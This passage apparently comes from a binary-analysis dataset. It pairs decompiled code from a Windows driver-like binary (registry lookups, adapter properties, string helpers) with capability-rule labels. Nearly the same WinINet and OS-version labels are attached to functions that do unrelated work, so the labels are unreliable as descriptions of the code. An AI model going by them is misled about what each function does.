arg4_00);\n            return arg3;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1167
    },
    "000307e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000307e0(void)\n\n{\n    int32_t aiStackX8 [2];\n    int32_t aiStackX16 [6];\n    \n    if (*0x7ef24 != 0) {\n        return *0x7ef24;\n    }\n    fcn.0006684e(aiStackX16, aiStackX8, 0, 0);\n    if (aiStackX16[0] == 5) {\n        if (aiStackX8[0] == 2) {\n            *0x7ef24 = 0x12;\n            return 0x12;\n        }\n    }\n    else if (aiStackX16[0] == 6) {\n        if (aiStackX8[0] == 0) {\n            *0x7ef24 = 0x27;\n            return 0x27;\n        }\n        if (aiStackX8[0] == 1) {\n            *0x7ef24 = 0x2f;\n            return 0x2f;\n        }\n        if (aiStackX8[0] == 2) {\n            *0x7ef24 = 0x32;\n            return 0x32;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 276
    },
    "000308e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000308e8(char *arg1, ulong *arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int64_t arg3_00;\n    uint16_t *puVar8;\n    uint32_t *apuStackX8 [4];\n    \n    if (arg1 != NULL) {\n        if (arg2 == NULL) {\n            return 0x21590066;\n        }\n        if (arg3 == NULL) {\n            return 0x21590067;\n        }\n        cVar5 = *arg1;\n        pcVar3 = NULL;\n        pcVar6 = arg1;\n        if (cVar5 != '\\0') {\n            do {\n                if (cVar5 == '.') {\n                    pcVar3 = pcVar6;\n                }\n                pcVar6 = pcVar6 + 1;\n                cVar5 = *pcVar6;\n            } while (cVar5 != '\\0');\n            if (pcVar3 != NULL) {\n                arg3_00 = 0;\n                do {\n                    arg3_00 = arg3_00 + 1;\n                } while (arg1[arg3_00] != '\\0');\n                uVar4 = fcn.00030564(0xb, apuStackX8);\n                if (uVar4 != 0) {\n                    return uVar4;\n                }\n                uVar7 = 0;\n                uVar4 = 0x21590005;\n                uVar1 = *apuStackX8[0];\n                if (uVar1 != 0) {\n                    puVar8 = apuStackX8[0] + 0x2e;\n                    do {\n                        if ((((uVar7 == 0) && (iVar2 = fcn.00030858(arg1, 73000, arg3_00),  iVar2 == 0)) ||\n                            ((uVar7 == 1 && (iVar2 = fcn.00030858(arg1, 0x14178, arg3_00),  iVar2 == 0)))) ||\n                           (iVar2 = fcn.00030858(apuStackX8[0] + *puVar8 + uVar7 * 0x128 + 0x30, arg1, arg3_00), \n                           iVar2 == 0)) {\n                            uVar4 = 0;\n                            *arg2 = *(apuStackX8[0] + uVar7 * 0x4a + 6);\n                            *arg3 = apuStackX8[0][uVar7 * 0x4a + 8];\n                            break;\n                        }\n                        uVar7 = uVar7 + 1;\n                        puVar8 = puVar8 + 0x94;\n                    } while (uVar7 < uVar1);\n                }\n                fcn.00030d24(apuStackX8[0]);\n                return uVar4;\n            }\n        }\n    }\n    return 0x21590065;\n}\n",
        "token_count": 690
    },
    "00030a54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00030a54(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint uVar7;\n    int32_t iVar8;\n    int64_t iStack112;\n    uchar auStack104 [56];\n    \n    iVar6 = 0;\n    iVar4 = 0;\n    bVar1 = false;\n    iVar8 = 0;\n    if (arg4 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar7 = 0;\n        uVar2 = (*_fcn.00011150)(arg1, 0, 0, 0, &iStack112, 0, 0, 0, 0);\n        if (-1 < uVar2) {\n            iVar3 = (*_fcn.000113e0)();\n            if (iStack112 == iVar3) {\n                uVar5 = 0;\n                if (in_stack_00000030 == 0) {\n                    fcn.0006670a(arg2, arg3, arg4);\n                }\n                else {\n                    fcn.0006670a(arg3, arg2, arg4);\n                }\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = arg4;\n                }\n            }\n            else {\n                uVar2 = 0;\n                iVar4 = (**0x11140)(arg3, arg4, 0, 0, 0);\n                if (iVar4 == 0) {\n                    uVar5 = 0xc000009a;\n                    iVar6 = 0;\n                }\n                else {\n                    (**0x113d8)(iStack112, auStack104);\n                    bVar1 = true;\n                    (**0x11138)(iVar4, 0, in_stack_00000030 != 0);\n                    iVar8 = 1;\n                    iVar6 = (**0x11230)(iVar4, 0, 1, 0, uVar2 & 0xffffffff00000000, CONCAT44(uVar7, 0x10));\n                    if (iVar6 == 0) {\n                        uVar5 = 0xc000009a;\n                    }\n                    else {\n                        if (in_stack_00000030 == 0) {\n                            fcn.0006670a(arg2, iVar6, arg4);\n                        }\n                        else {\n                            fcn.0006670a(iVar6, arg2, arg4);\n                        }\n                        uVar5 = 0;\n                    }\n                }\n            }\n            if (iVar6 != 0) {\n                (**0x11238)(iVar6, iVar4);\n            }\n            if (iVar8 != 0) {\n                (**0x11130)(iVar4);\n            }\n            if (bVar1) {\n                (*_fcn.000113d0)(auStack104);\n            }\n            if (iVar4 != 0) {\n                (*_fcn.00011128)(iVar4);\n            }\n            (*_fcn.000115b8)(iStack112);\n            uVar2 = uVar5;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 745
    },
    "00031328": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00031328(int16_t *arg1, ushort *arg2, int64_t arg3)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    bool bVar5;\n    \n    bVar5 = arg3 == 0;\n    while( true ) {\n        if (bVar5) {\n            return 0;\n        }\n        iVar1 = fcn.0006689c(*arg1);\n        iVar2 = fcn.0006689c();\n        if (iVar1 != iVar2) break;\n        if (*arg1 == 0) {\n            return 0;\n        }\n        arg1 = arg1 + 1;\n        arg2 = arg2 + 1;\n        arg3 = arg3 + -1;\n        bVar5 = arg3 == 0;\n    }\n    uVar3 = fcn.0006689c(*arg1);\n    uVar4 = fcn.0006689c(*arg2);\n    return uVar3 - uVar4;\n}\n",
        "token_count": 239
    },
    "00031420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00031420(int16_t *arg1, ulong arg2, int16_t *arg3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t arg2_00;\n    int16_t *piVar4;\n    \n    arg2_00 = arg2;\n    if (*arg3 == 0x5c) {\n        fcn.00066740(arg1, arg3, arg2_00);\n    }\n    else {\n        if ((*arg3 != 0) && (arg3[1] == 0x3a)) {\n            uVar2 = fcn.00066722(arg1, arg2_00, 0x14200, arg3);\n            if ((-1 < uVar2) && (uVar2 != arg2)) {\n                return;\n            }\n            arg1[arg2 - 1] = 0;\n            return;\n        }\n        fcn.00028f34(arg1, arg2_00);\n        uVar3 = 0xffffffffffffffff;\n        piVar4 = arg1;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        fcn.000667ca(arg1, arg3, arg2_00 - (~uVar3 - 1));\n    }\n    arg1[arg2 - 1] = 0;\n    return;\n}\n",
        "token_count": 346
    },
    "00031f44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00031f44(ulong arg1, uchar *arg2, int64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t aiStackX16 [2];\n    ulong uStackX32;\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0;\n    }\n    *arg2 = 0;\n    if ((*0x7f8d0 == 0) && (cVar1 = (*_fcn.000115f8)(),  cVar1 == '\\0')) {\n        iVar2 = (*_fcn.00011220)(&uStackX32, 0, 0, 0, 0, 0x31ef4, 0x7f8d0);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.000667be(uStackX32, 0, 0);\n        fcn.000666f2(uStackX32);\n        if (*0x7f8d0 == 0) {\n            *arg2 = 0;\n            return 0;\n        }\n    }\n    if (arg1 == 0) {\n        aiStackX16[0] = (*_fcn.000113e0)();\n    }\n    else {\n        cVar1 = (*_fcn.000115f8)();\n        if ((cVar1 != '\\0') || (iVar2 = (*_fcn.00011410)(arg1, aiStackX16),  iVar2 != 0)) {\n            return 0;\n        }\n    }\n    fcn.00066830(arg2, *0x7f8d0 + aiStackX16[0], arg3);\n    arg2[arg3 + -1] = 0;\n    if (arg1 != 0) {\n        (*_fcn.000115b8)(aiStackX16[0]);\n    }\n    return 1;\n}\n",
        "token_count": 436
    },
    "00032174": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00032174(int32_t *arg1)\n\n{\n    bool bVar1;\n    \n    (*_fcn.00011630)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    if ((arg1[1] < 1) && (arg1[2] != -1)) {\n        bVar1 = false;\n        arg1[2] = arg1[2] + 1;\n    }\n    else {\n        bVar1 = true;\n        *arg1 = *arg1 + 1;\n    }\n    (**0x113b0)(*(arg1 + 4) + 0x40, 0);\n    if (bVar1) {\n        (*_fcn.00011630)(*(arg1 + 4), 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00032684": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00032684(int64_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    if (arg3 == 0) {\n        LOCK();\n        *arg1 = *arg1 + -1;\n    }\n    else if (arg3 == 1) {\n        LOCK();\n        arg1[1] = arg1[1] + -1;\n    }\n    else if (arg3 == 2) {\n        LOCK();\n        arg1[2] = arg1[2] + -1;\n    }\n    if (*arg2 < 2) {\n        (*_fcn.000111f0)(*arg2);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0003285c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003285c(char *arg1, int64_t arg2, int64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    uint32_t auStackX24 [4];\n    \n    if (arg3 != 0) {\n        iVar3 = -1;\n        pcVar4 = arg1;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = fcn.000668c6(arg2, arg3 * 2 + -2, auStackX24, arg1, ~iVar3 - 1);\n        if (iVar2 == 0) {\n            *(auStackX24[0] + arg2) = 0;\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 229
    },
    "000328b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000328b8(int16_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint32_t auStackX24 [4];\n    \n    if (arg3 != 0) {\n        iVar3 = -1;\n        piVar4 = arg1;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iVar2 = fcn.000668cc(arg2, arg3 + -1, auStackX24, arg1, (~iVar3 - 1) * 2);\n        if (iVar2 == 0) {\n            *(auStackX24[0] + arg2) = 0;\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 232
    },
    "0003328c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0003328c(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x18) == 0)) {\n        *arg2 = *(iVar1 + 0x470);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 163
    },
    "00033418": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00033418(int64_t arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    puVar2 = *0x7f8e0;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x0003345a:\n            fcn.00032684(0x7f8f0, auStackX24, 0);\n            return ~-(puVar2 != NULL) & 0xc000000e;\n        }\n        if (*(puVar2 + 3) == 0) {\n            if (puVar2[1] != 0) {\n                iVar1 = fcn.000342cc(puVar2[1], arg1);\n                if (iVar1 != 0) goto code_r0x00033455;\n            }\n        }\n        else if (puVar2[0x8f] == arg1) {\ncode_r0x00033455:\n            *arg2 = *(puVar2 + 2);\n            goto code_r0x0003345a;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 290
    },
    "0003349c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0003349c(int64_t arg1, uint *arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    puVar1 = *0x7f8e0;\n    do {\n        if (puVar1 == NULL) {\ncode_r0x000334e3:\n            fcn.00032684(0x7f8f0, auStackX24, 0);\n            return ~-(puVar1 != NULL) & 0xc000000e;\n        }\n        if ((*(puVar1 + 3) != 0) && (puVar1[0x90] == arg1)) {\n            *arg2 = *(puVar1 + 2);\n            goto code_r0x000334e3;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 217
    },
    "000337a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.000337a4(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x18) != 0)) {\n        *(iVar1 + 0x490) = arg2;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 162
    },
    "0003380c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0003380c(ulong arg1, ulong *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x470) == 0) {\n            *arg2 = *(iVar1 + 0x468);\n        }\n        else {\n            iVar1 = 0;\n        }\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 179
    },
    "00033880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00033880(ulong arg1, ulong *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x18) != 0)) {\n        *arg2 = *(iVar1 + 0x488);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 162
    },
    "000338ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.000338ec(ulong arg1, ulong *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x18) != 0)) {\n        *arg2 = *(iVar1 + 0x480);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 162
    },
    "00033958": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00033958(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x18) != 0)) {\n        *arg2 = *(iVar1 + 0x490);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 162
    },
    "00033dd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint64_t fcn.00033dd8(int16_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    char16_t cVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int16_t *piVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    int32_t iVar11;\n    char16_t *pcVar12;\n    int16_t *piVar13;\n    int64_t iVar14;\n    int32_t aiStackX24 [2];\n    int64_t *piStackX32;\n    int64_t *piStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    ulong var_1h;\n    \n    piStackX32 = NULL;\n    uVar4 = (**0x11058)();\n    if ((uVar4 < 0x620) || (*(arg2 + 0x1c) != 0)) {\n        uVar6 = 0;\n    }\n    else {\n        uVar6 = fcn.00036394(L\"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n                             , 0, &piStackX32);\n        if (uVar6 == 0) {\n            iVar11 = 0;\n            iVar14 = 0;\n            if (*piStackX32 != 0) {\n                iVar10 = 0;\n                uVar1 = 0xffffffffffffffff;\n                iVar11 = 0;\n                do {\n                    piStack88 = NULL;\n                    uVar4 = fcn.00036394(*(iVar10 + piStackX32), 0, &piStack88);\n                    uVar6 = uVar4;\n                    if (uVar4 != 0) {\n                        fcn.00036358(piStackX32);\n                        piStackX32 = NULL;\n                        goto code_r0x0003406e;\n                    }\n                    iVar10 = 0;\n                    if (*piStack88 != 0) {\n                        iVar8 = 0;\n                        do {\n                            piVar7 = fcn.00066764(*(iVar8 + piStack88));\n                            uVar6 = uVar1;\n                            piVar13 = piVar7;\n                            if (piVar7 != NULL) {\n                                do {\n                                    piVar13 = piVar13 + 1;\n                                    if (uVar6 == 0) break;\n                                    uVar6 = uVar6 - 1;\n                                } while (*piVar13 != 0);\n                                uVar9 = uVar1;\n                                pcVar12 = L\"Linkage\";\n                                do {\n                                    if (uVar9 == 0) break;\n                                    uVar9 = uVar9 - 1;\n                                    cVar2 = *pcVar12;\n                                    pcVar12 = pcVar12 + 1;\n                                } while (cVar2 != L'\\0');\n                                if ((~uVar6 - 1 == ~uVar9 - 1) && (iVar5 = fcn.00066758(piVar7 + 1),  iVar5 == 0))\n                                break;\n                            }\n                            iVar10 = iVar10 + 1;\n                            iVar8 = iVar10 * 8;\n                        } while (piStack88[iVar10] != 0);\n                    }\n                    if ((piStack88[iVar10] != 0) &&\n                       (iVar5 = fcn.000361e4(piStack88[iVar10], L\"Export\", aiStackX24, &uStack80),  iVar5 == 0)) {\n                        uVar6 = uVar1;\n                        piVar13 = arg1;\n                        if ((aiStackX24[0] == 1) || (aiStackX24[0] == 7)) {\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                iVar3 = *piVar13;\n                                piVar13 = piVar13 + 1;\n                            } while (iVar3 != 0);\n                            if ((~uVar6 - 1 <= uStack72 >> 1) &&\n                               (iVar5 = fcn.00031328(arg1, uStack80, ~uVar6 - 1),  iVar5 == 0)) {\n                                fcn.00030d24(uStack80);\n                                fcn.00036358(piStack88);\n                                break;\n                            }\n                        }\n                        fcn.00030d24(uStack80);\n                    }\n                    fcn.00036358(piStack88);\n                    iVar14 = iVar14 + 1;\n                    iVar11 = iVar11 + 1;\n                    iVar10 = iVar14 * 8;\n                } while (piStackX32[iVar14] != 0);\n            }\n            if (piStackX32[iVar11] == 0) {\n                uVar6 = 0xc0000001;\n            }\n            else {\n                uVar4 = fcn.000360f8(piStackX32[iVar11], L\"*IfType\", 4, arg2 + 0x494);\n                uVar6 = uVar4;\n                if (uVar4 == 0) {\n                    uVar4 = fcn.000360f8(piStackX32[iVar11], L\"*MediaType\", 4, arg2 + 0x498);\n                    uVar6 = uVar4;\n                    if (uVar4 == 0) {\n                        uVar4 = fcn.000360f8(piStackX32[iVar11], L\"*PhysicalMediaType\", 4, arg2 + 0x49c);\n                        uVar6 = uVar4;\n                    }\n                }\n            }\ncode_r0x0003406e:\n            fcn.00036358(piStackX32);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 1300
    },
    "00034650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00034650(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_stack_00000028;\n    uint32_t auStack232 [2];\n    uint32_t *puStack224;\n    uchar auStack216 [32];\n    uchar auStack184 [72];\n    uint8_t uStack112;\n    \n    iVar1 = in_stack_00000028;\n    puStack224 = NULL;\n    auStack232[0] = 0;\n    uVar2 = (**0x7f930)(arg1, arg4);\n    if ((uVar2 == 0) && (uVar2 = fcn.000333b0(*arg4, auStack232),  uVar2 == 0)) {\n        uVar2 = fcn.00033958(auStack232[0], &stack0x00000028);\n        if (uVar2 == 0) {\n            if ((in_stack_00000028 == 1) && (*arg3 == auStack232[0])) {\n                *arg3 = auStack232[0];\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = 0x17;\n                if (iVar1 == 0) {\n                    uVar2 = 2;\n                }\n                uVar2 = (**0x7f948)(uVar2, &puStack224);\n                if (uVar2 == 0) {\n                    uVar6 = 0;\n                    uVar2 = 0x2159000e;\n                    uVar5 = 0xffffffff;\n                    if (*puStack224 != 0) {\n                        iVar4 = 0;\n                        puVar3 = puStack224;\n                        do {\n                            if (((((*(iVar4 + 0x78 + puVar3) != '\\0') && (0 < *(iVar4 + 0x80 + puVar3))) &&\n                                 (iVar1 = fcn.000333b0(*(iVar4 + 0x48 + puVar3), auStack232),  puVar3 = puStack224, \n                                 iVar1 == 0)) &&\n                                ((iVar1 = fcn.00033958(auStack232[0], &stack0x00000028),  puVar3 = puStack224, \n                                 iVar1 == 0 && (in_stack_00000028 == 1)))) &&\n                               (iVar1 = (**0x7f918)(0, *(iVar4 + 0x48 + puStack224), arg2, arg1, 0, auStack184, \n                                                    auStack216),  puVar3 = puStack224,  iVar1 == 0)) {\n                                if ((uVar5 == 0xffffffff) || (uVar5 < uStack112)) {\n                                    uVar5 = uStack112;\n                                    *arg3 = auStack232[0];\n                                    *arg4 = *(iVar4 + 0x48 + puStack224);\n                                }\n                                uVar2 = 0;\n                            }\n                            uVar6 = uVar6 + 1;\n                            iVar4 = iVar4 + 0x88;\n                        } while (uVar6 < *puVar3);\n                    }\n                    (**0x7f940)();\n                }\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 765
    },
    "000349c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000349c0(int16_t *arg1, uint32_t *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint auStack360 [2];\n    uchar auStack352 [32];\n    uchar auStack320 [32];\n    uchar auStack288 [40];\n    uchar auStack248 [44];\n    int16_t aiStack204 [4];\n    int32_t iStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uchar auStack136 [28];\n    uint uStack108;\n    uchar auStack96 [32];\n    uint32_t uStack64;\n    \n    if ((*0x7f908 == 0) || (*0x7f928 == 0)) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        fcn.0006677c(auStack248, 0, 0x68);\n        fcn.0006670a(auStack288, arg1, 0x1c);\n        fcn.0006670a(auStack352, arg3, 0x1c);\n        uVar1 = fcn.00034650(auStack288, auStack352, arg2, auStack360);\n        if (uVar1 == 0) {\n            uVar1 = (**0x7f918)(0, auStack360[0], auStack352, auStack288, 0, auStack248, auStack320);\n            if (uVar1 == 0) {\n                if ((aiStack204[0] == 0x17) &&\n                   ((((iStack196 != 0 